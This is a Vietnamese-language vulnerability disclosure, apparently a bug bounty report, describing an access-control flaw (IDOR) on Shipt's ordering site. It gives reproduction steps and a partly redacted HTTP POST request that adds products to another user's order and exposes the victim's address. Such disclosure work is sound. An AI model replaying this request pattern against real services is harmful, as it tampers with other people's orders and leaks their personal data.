
### **1. Bối cảnh:**

Trang web của Shipt cho phép người dùng đặt và sửa đổi đơn hàng sau khi đã đặt. Tuy nhiên, hệ thống không kiểm tra đúng quyền truy cập của người dùng đối với các đơn hàng của người khác. Điều này cho phép kẻ tấn công tiết lộ thông tin về đơn hàng của người khác và thêm sản phẩm vào đơn hàng của người khác.

### **2. Các bước tái tạo PoC:**

#### **Bước 1: Đặt đơn hàng**

* Tạo hai tài khoản người dùng khác nhau, ví dụ: **bzhunt.pentester.one** và **bzhunt.pentester.two**.
* Đặt một đơn hàng trên mỗi tài khoản và đảm bảo rằng đơn hàng được đặt ở trạng thái "chờ xử lý".

#### **Bước 2: Lấy ID đơn hàng**

* ID đơn hàng của kẻ tấn công và nạn nhân sẽ được sử dụng trong quá trình khai thác:

  * **ID đơn hàng của kẻ tấn công**: `1813918441`
  * **ID đơn hàng của nạn nhân**: `181396149`

#### **Bước 3: Thực hiện yêu cầu HTTP**

* Kẻ tấn công có thể thay đổi đơn hàng của người khác bằng cách gửi một yêu cầu HTTP POST để thêm sản phẩm vào đơn hàng của nạn nhân. Cấu trúc của yêu cầu HTTP có thể trông như sau:

```http
POST /aviator/v2/orders/181396149/add.json?anonymous_id=█████&white_label_key=█████&user_id=█████&store_id=60&bucket_number=72&products=[{"id":4799771,"qty":1,"note":""}] HTTP/2
Host: ██████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/███████ Firefox/110.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 154
Origin: █████████
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

#### **Bước 4: Kiểm tra kết quả**

* Sau khi yêu cầu được gửi đi, sản phẩm sẽ được thêm vào đơn hàng của nạn nhân và thông tin về địa chỉ của nạn nhân sẽ bị lộ. Thêm vào đó, nếu có bất kỳ sản phẩm nào bị thêm vào đơn hàng, điều này sẽ hiển thị trên trang web của nạn nhân.

